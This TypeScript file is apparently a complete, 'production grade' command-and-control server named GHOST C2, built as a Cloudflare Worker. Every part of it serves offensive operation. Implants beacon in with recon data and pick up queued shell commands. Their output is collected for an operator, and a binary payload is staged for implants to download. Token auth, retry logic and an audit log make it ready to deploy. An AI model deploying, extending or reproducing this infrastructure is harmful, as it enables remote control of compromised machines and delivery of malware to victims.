/**
 * GHOST C2 — Cloudflare Worker
 * 
 * PRODUCTION GRADE:
 * - URL-decodes session IDs (fixes pipe issue).
 * - Results kept by default; ?clear=1 removes.
 * - Retry logic for KV operations (3 attempts with backoff).
 * - Detailed logging for debugging.
 */
interface Env {
  GHOST_KV: KVNamespace;
  BEACON_TOKEN: string;
  OPERATOR_TOKEN: string;
  SESSION_TIMEOUT_SECONDS: string;
  CORS_ORIGIN: string;
}

interface SessionData {
  session: string;
  remote_ip: string;
  first_seen: string;
  last_beacon: string;
  recon: Record<string, unknown>;
  pending_tasks: number;
  result_count: number;
}

interface ResultEntry {
  ts: string;
  output: string;
}

interface BeaconRequest {
  session: string;
  recon?: Record<string, unknown>;
}

interface ResultRequest {
  session: string;
  output: string;
}

interface TaskRequest {
  session: string;
  cmd: string;
}

interface AuditEntry {
  ts: string;
  ip: string;
  action: string;
  detail: Record<string, unknown>;
}

// ─── Helpers ──────────────────────────────────────────────

function jsonResponse(data: unknown, status = 200): Response {
  return new Response(JSON.stringify(data), {
    status,
    headers: { "Content-Type": "application/json" },
  });
}

function errorResponse(message: string, status: number): Response {
  return jsonResponse({ error: message }, status);
}

function secureCompare(a: string, b: string): boolean {
  if (a.length !== b.length) return false;
  const encoder = new TextEncoder();
  const bufA = encoder.encode(a);
  const bufB = encoder.encode(b);
  let diff = 0;
  for (let i = 0; i < bufA.length; i++) {
    diff |= bufA[i] ^ bufB[i];
  }
  return diff === 0;
}

function getClientIP(request: Request): string {
  return request.headers.get("CF-Connecting-IP")
    ?? request.headers.get("X-Real-IP")
    ?? "unknown";
}

function clampString(s: string, maxLen: number): string {
  return s.length > maxLen ? s.slice(0, maxLen) : s;
}

function getSessionTimeout(env: Env): number {
  return parseInt(env.SESSION_TIMEOUT_SECONDS || "600", 10);
}

function withCORS(response: Response, env: Env): Response {
  const origin = env.CORS_ORIGIN || "*";
  const headers = new Headers(response.headers);
  headers.set("Access-Control-Allow-Origin", origin);
  headers.set("Access-Control-Allow-Methods", "GET, POST, DELETE, OPTIONS");
  headers.set("Access-Control-Allow-Headers", "Content-Type, X-Beacon-Token, X-Operator-Token");
  headers.set("Access-Control-Max-Age", "86400");
  return new Response(response.body, {
    status: response.status,
    statusText: response.statusText,
    headers,
  });
}

// ─── KV Operations with Retry ─────────────────────────────

const MAX_RETRIES = 3;
const RETRY_DELAY_MS = 200;

async function withRetry<T>(fn: () => Promise<T>): Promise<T> {
  let lastError: Error | undefined;
  for (let attempt = 0; attempt < MAX_RETRIES; attempt++) {
    try {
      return await fn();
    } catch (err) {
      lastError = err as Error;
      if (attempt < MAX_RETRIES - 1) {
        await new Promise(resolve => setTimeout(resolve, RETRY_DELAY_MS * (attempt + 1)));
      }
    }
  }
  throw lastError || new Error("KV operation failed after retries");
}

async function getSession(kv: KVNamespace, sid: string): Promise<SessionData | null> {
  return withRetry(async () => {
    const raw = await kv.get(`session:${sid}`);
    return raw ? JSON.parse(raw) as SessionData : null;
  });
}

async function putSession(kv: KVNamespace, sid: string, data: SessionData, ttl: number): Promise<void> {
  await withRetry(async () => {
    await kv.put(`session:${sid}`, JSON.stringify(data), { expirationTtl: ttl });
  });
}

async function getTasks(kv: KVNamespace, sid: string): Promise<string[]> {
  return withRetry(async () => {
    const raw = await kv.get(`tasks:${sid}`);
    return raw ? JSON.parse(raw) as string[] : [];
  });
}

async function putTasks(kv: KVNamespace, sid: string, tasks: string[], sessionTtl = 86400): Promise<void> {
  await withRetry(async () => {
    if (tasks.length === 0) {
      await kv.delete(`tasks:${sid}`);
    } else {
      await kv.put(`tasks:${sid}`, JSON.stringify(tasks), { expirationTtl: 86400 });
    }
    // Update denormalized count
    const raw = await kv.get(`session:${sid}`);
    if (raw) {
      const data = JSON.parse(raw) as SessionData;
      data.pending_tasks = tasks.length;
      await kv.put(`session:${sid}`, JSON.stringify(data), { expirationTtl: sessionTtl });
    }
  });
}

async function getResults(kv: KVNamespace, sid: string): Promise<ResultEntry[]> {
  return withRetry(async () => {
    const raw = await kv.get(`results:${sid}`);
    return raw ? JSON.parse(raw) as ResultEntry[] : [];
  });
}

async function putResults(kv: KVNamespace, sid: string, results: ResultEntry[]): Promise<void> {
  await withRetry(async () => {
    if (results.length === 0) {
      await kv.delete(`results:${sid}`);
    } else {
      await kv.put(`results:${sid}`, JSON.stringify(results), { expirationTtl: 86400 });
    }
  });
}

async function appendResult(kv: KVNamespace, sid: string, entry: ResultEntry): Promise<void> {
  await withRetry(async () => {
    const results = await getResults(kv, sid);
    const RESULT_CAP = 500;
    const BYTE_CAP = 20 * 1024 * 1024;
    if (results.length >= RESULT_CAP) results.shift();
    results.push(entry);

    const payload = JSON.stringify(results);
    if (payload.length > BYTE_CAP) {
      while (results.length > 1 && JSON.stringify(results).length > BYTE_CAP) {
        results.shift();
      }
    }
    await putResults(kv, sid, results);

    // Update denormalized count
    const raw = await kv.get(`session:${sid}`);
    if (raw) {
      const data = JSON.parse(raw) as SessionData;
      data.result_count = results.length;
      await kv.put(`session:${sid}`, JSON.stringify(data), { expirationTtl: 86400 });
    }
  });
}

async function listSessionKeys(kv: KVNamespace): Promise<string[]> {
  return withRetry(async () => {
    const keys: string[] = [];
    let cursor: string | undefined;
    do {
      const result = await kv.list({ prefix: "session:", cursor, limit: 1000 });
      for (const key of result.keys) keys.push(key.name);
      cursor = result.list_complete ? undefined : result.cursor;
    } while (cursor);
    return keys;
  });
}

async function logAudit(kv: KVNamespace, entry: AuditEntry): Promise<void> {
  await withRetry(async () => {
    const key = "audit_log";
    const raw = await kv.get(key);
    const log: AuditEntry[] = raw ? JSON.parse(raw) as AuditEntry[] : [];
    if (log.length >= 1000) log.splice(0, log.length - 999);
    log.push(entry);
    await kv.put(key, JSON.stringify(log), { expirationTtl: 604800 });
  });
}

// ─── Route Handlers ───────────────────────────────────────

async function handleBeacon(request: Request, env: Env): Promise<Response> {
  const body = await request.json() as BeaconRequest;
  if (!body?.session) return errorResponse("Missing session field", 400);

  const sid = clampString(String(body.session), 128);
  const now = new Date().toISOString();
  const ip = getClientIP(request);
  const ttl = getSessionTimeout(env);

  const existing = await getSession(env.GHOST_KV, sid);
  const session: SessionData = {
    session: sid,
    remote_ip: ip,
    first_seen: existing?.first_seen ?? now,
    last_beacon: now,
    recon: body.recon ?? existing?.recon ?? {},
    pending_tasks: existing?.pending_tasks ?? 0,
    result_count: existing?.result_count ?? 0,
  };
  await putSession(env.GHOST_KV, sid, session, ttl);

  const tasks = await getTasks(env.GHOST_KV, sid);
  if (tasks.length > 0) {
    const cmd = tasks.shift()!;
    await putTasks(env.GHOST_KV, sid, tasks);
    console.log(`[beacon] sid=${sid} ip=${ip} tasked="${cmd}"`);
    return jsonResponse({ cmd });
  }

  console.log(`[beacon] sid=${sid} ip=${ip} sleep`);
  return jsonResponse({ cmd: "sleep" });
}

async function handleResult(request: Request, env: Env): Promise<Response> {
  const body = await request.json() as ResultRequest;
  if (!body?.session || body.output === undefined) {
    return errorResponse("Missing session or output field", 400);
  }

  const sid = clampString(String(body.session), 128);
  const output = clampString(String(body.output), 65536);
  const entry: ResultEntry = { ts: new Date().toISOString(), output };
  await appendResult(env.GHOST_KV, sid, entry);

  // Ensure session exists (re‑register if purged)
  const existing = await getSession(env.GHOST_KV, sid);
  if (!existing) {
    const now = new Date().toISOString();
    await putSession(env.GHOST_KV, sid, {
      session: sid,
      remote_ip: getClientIP(request),
      first_seen: now,
      last_beacon: now,
      recon: {},
      pending_tasks: 0,
      result_count: 1,
    }, getSessionTimeout(env));
  }

  console.log(`[result] sid=${sid} len=${output.length}`);
  return jsonResponse({ status: "ok" });
}

async function handleListSessions(request: Request, env: Env): Promise<Response> {
  const keys = await listSessionKeys(env.GHOST_KV);
  const now = Date.now();
  const sessions: Record<string, unknown>[] = [];

  for (const key of keys) {
    const sid = key.replace("session:", "");
    const data = await getSession(env.GHOST_KV, sid);
    if (!data) continue;
    const lastBeaconMs = new Date(data.last_beacon).getTime();
    sessions.push({
      session: data.session,
      remote_ip: data.remote_ip,
      first_seen: data.first_seen,
      last_beacon: data.last_beacon,
      idle_seconds: Math.round((now - lastBeaconMs) / 1000),
      recon: data.recon,
      pending_tasks: data.pending_tasks ?? 0,
      result_count: data.result_count ?? 0,
    });
  }

  await logAudit(env.GHOST_KV, {
    ts: new Date().toISOString(),
    ip: getClientIP(request),
    action: "list_sessions",
    detail: { count: sessions.length },
  });

  return jsonResponse(sessions);
}

async function handleAddTask(request: Request, env: Env): Promise<Response> {
  const body = await request.json() as TaskRequest;
  if (!body?.session || !body?.cmd) {
    return errorResponse("Missing session or cmd field", 400);
  }

  const sid = clampString(String(body.session), 128);
  const cmd = clampString(String(body.cmd), 4096);

  const session = await getSession(env.GHOST_KV, sid);
  if (!session) return errorResponse("Session not found", 404);

  const tasks = await getTasks(env.GHOST_KV, sid);
  tasks.push(cmd);
  await putTasks(env.GHOST_KV, sid, tasks);

  await logAudit(env.GHOST_KV, {
    ts: new Date().toISOString(),
    ip: getClientIP(request),
    action: "task_queued",
    detail: { session: sid, cmd },
  });

  console.log(`[task] sid=${sid} cmd="${cmd}" depth=${tasks.length}`);
  return jsonResponse({ status: "queued", queue_depth: tasks.length });
}

async function handleGetResults(request: Request, env: Env, sid: string): Promise<Response> {
  // Decode URL-encoded session ID (fix for pipe character)
  sid = decodeURIComponent(sid);

  const session = await getSession(env.GHOST_KV, sid);
  if (!session) {
    return errorResponse("Session not found", 404);
  }

  const results = await getResults(env.GHOST_KV, sid);
  const url = new URL(request.url);
  const clear = url.searchParams.get("clear") === "1";

  if (clear) {
    await putResults(env.GHOST_KV, sid, []);
  }

  await logAudit(env.GHOST_KV, {
    ts: new Date().toISOString(),
    ip: getClientIP(request),
    action: "get_results",
    detail: { session: sid, count: results.length, clear },
  });

  return jsonResponse({ session: sid, results });
}

async function handleKillSession(request: Request, env: Env, sid: string): Promise<Response> {
  sid = decodeURIComponent(sid);

  const session = await getSession(env.GHOST_KV, sid);
  if (!session) return errorResponse("Session not found", 404);

  const tasks = await getTasks(env.GHOST_KV, sid);
  tasks.unshift("exit");
  await putTasks(env.GHOST_KV, sid, tasks);

  await logAudit(env.GHOST_KV, {
    ts: new Date().toISOString(),
    ip: getClientIP(request),
    action: "kill_session",
    detail: { session: sid },
  });

  console.log(`[kill] sid=${sid} exit queued`);
  return jsonResponse({ status: "exit_queued", session: sid });
}

async function handleAudit(request: Request, env: Env): Promise<Response> {
  const url = new URL(request.url);
  const limit = Math.min(parseInt(url.searchParams.get("limit") || "100", 10), 1000);
  const raw = await env.GHOST_KV.get("audit_log");
  const log: AuditEntry[] = raw ? JSON.parse(raw) as AuditEntry[] : [];
  return jsonResponse({ entries: log.slice(-limit) });
}

function handleHealth(): Response {
  return jsonResponse({ status: "ok" });
}

async function handleUploadPayload(request: Request, env: Env): Promise<Response> {
  const body = await request.arrayBuffer();
  if (!body || body.byteLength === 0) return errorResponse("Empty body", 400);
  if (body.byteLength > 32 * 1024 * 1024) return errorResponse("Payload too large (max 32 MB)", 413);
  await env.GHOST_KV.put("payload:ghost", body, { expirationTtl: 86400 * 30 });
  await logAudit(env.GHOST_KV, {
    ts: new Date().toISOString(),
    ip: getClientIP(request),
    action: "payload_uploaded",
    detail: { bytes: body.byteLength },
  });
  console.log(`[payload] uploaded ${body.byteLength} bytes`);
  return jsonResponse({ status: "ok", bytes: body.byteLength });
}

async function handleDownloadPayload(env: Env): Promise<Response> {
  const raw = await env.GHOST_KV.get("payload:ghost", { type: "arrayBuffer" });
  if (!raw) return errorResponse("Payload not found", 404);
  return new Response(raw, {
    status: 200,
    headers: {
      "Content-Type": "application/octet-stream",
      "Content-Length": String(raw.byteLength),
      "Cache-Control": "no-store",
    },
  });
}

// ─── Auth Middleware ───────────────────────────────────────

function requireBeaconToken(request: Request, env: Env): Response | null {
  const token = request.headers.get("X-Beacon-Token") || "";
  if (!env.BEACON_TOKEN || !secureCompare(token, env.BEACON_TOKEN)) {
    console.log(`[auth] beacon auth failure ip=${getClientIP(request)}`);
    return errorResponse("Unauthorized", 401);
  }
  return null;
}

function requireOperatorToken(request: Request, env: Env): Response | null {
  const token = request.headers.get("X-Operator-Token") || "";
  if (!env.OPERATOR_TOKEN || !secureCompare(token, env.OPERATOR_TOKEN)) {
    console.log(`[auth] operator auth failure ip=${getClientIP(request)}`);
    return errorResponse("Unauthorized", 401);
  }
  return null;
}

// ─── Router ───────────────────────────────────────────────

async function handleRequest(request: Request, env: Env): Promise<Response> {
  const url = new URL(request.url);
  const path = url.pathname;
  const method = request.method;

  if (method === "OPTIONS") {
    return withCORS(new Response(null, { status: 204 }), env);
  }

  if (path === "/health" && method === "GET") {
    return withCORS(handleHealth(), env);
  }

  if (path === "/beacon" && method === "POST") {
    const authErr = requireBeaconToken(request, env);
    if (authErr) return withCORS(authErr, env);
    return withCORS(await handleBeacon(request, env), env);
  }

  if (path === "/result" && method === "POST") {
    const authErr = requireBeaconToken(request, env);
    if (authErr) return withCORS(authErr, env);
    return withCORS(await handleResult(request, env), env);
  }

  if (path === "/sessions" && method === "GET") {
    const authErr = requireOperatorToken(request, env);
    if (authErr) return withCORS(authErr, env);
    return withCORS(await handleListSessions(request, env), env);
  }

  if (path === "/task" && method === "POST") {
    const authErr = requireOperatorToken(request, env);
    if (authErr) return withCORS(authErr, env);
    return withCORS(await handleAddTask(request, env), env);
  }

  if (path === "/audit" && method === "GET") {
    const authErr = requireOperatorToken(request, env);
    if (authErr) return withCORS(authErr, env);
    return withCORS(await handleAudit(request, env), env);
  }

  // ── Parameterised routes – decode session ID ──
  const resultsMatch = path.match(/^\/results\/(.+)$/);
  if (resultsMatch && method === "GET") {
    const authErr = requireOperatorToken(request, env);
    if (authErr) return withCORS(authErr, env);
    const sid = decodeURIComponent(resultsMatch[1]);
    return withCORS(await handleGetResults(request, env, sid), env);
  }

  const sessionsMatch = path.match(/^\/sessions\/(.+)$/);
  if (sessionsMatch && method === "DELETE") {
    const authErr = requireOperatorToken(request, env);
    if (authErr) return withCORS(authErr, env);
    const sid = decodeURIComponent(sessionsMatch[1]);
    return withCORS(await handleKillSession(request, env, sid), env);
  }

  if (path === "/payload" && method === "POST") {
    const authErr = requireOperatorToken(request, env);
    if (authErr) return withCORS(authErr, env);
    return withCORS(await handleUploadPayload(request, env), env);
  }

  if (path === "/payload" && method === "GET") {
    const authErr = requireBeaconToken(request, env);
    if (authErr) return withCORS(authErr, env);
    return withCORS(await handleDownloadPayload(env), env);
  }

  return withCORS(errorResponse("Not found", 404), env);
}

export default {
  async fetch(request: Request, env: Env, _ctx: ExecutionContext): Promise<Response> {
    try {
      return await handleRequest(request, env);
    } catch (err) {
      const message = err instanceof Error ? err.message : "Internal error";
      console.error(`[error] ${message}`);
      return withCORS(errorResponse("Internal server error", 500), env);
    }
  },
};